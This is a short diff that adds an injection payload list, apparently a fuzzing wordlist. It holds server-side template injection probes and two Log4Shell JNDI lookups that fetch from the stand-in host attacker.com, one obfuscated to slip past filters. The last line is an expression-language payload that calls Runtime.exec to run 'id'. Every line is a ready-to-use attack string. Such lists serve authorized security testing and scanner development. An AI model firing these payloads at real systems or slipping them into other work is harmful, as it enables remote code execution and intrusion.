@@ -1,0 +1,10 @@
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+<% 7*7 %>
+${{7*7}}
+#{7*7}}
+${jndi:ldap://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+T(0).TYPE.forName('java.lang.Runtime').METHOD('getRuntime',null).INVOKE(null,null).METHOD('exec',T(java.lang.String[])).INVOKE(null,T({'id'}))
